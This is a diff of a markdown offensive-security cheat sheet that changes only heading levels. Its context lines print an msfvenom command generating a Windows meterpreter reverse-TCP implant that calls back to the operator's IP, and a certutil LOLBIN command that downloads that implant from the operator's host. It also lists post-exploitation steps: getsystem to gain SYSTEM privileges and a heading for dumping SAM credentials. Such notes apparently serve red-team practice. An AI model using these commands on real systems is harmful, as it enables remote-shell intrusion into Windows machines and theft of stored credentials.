@@ -1,4 +1,4 @@
-### stable access
+# stable access
 #### generate implant  
 > msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=443 LHOST=***[OWN IP]*** -f exe -o implant.exe  
 #### start c2  
@@ -13,7 +13,7 @@
 #### windows LOLBIN basic download of implant
 > certutil -urlcache -f http://***[OWN IP]***/implant.exe implant.exe  
 
-### actions on target
+# actions on target
 #### attempt to get SYSTEM privs
 > getsystem  
 #### dump SAM
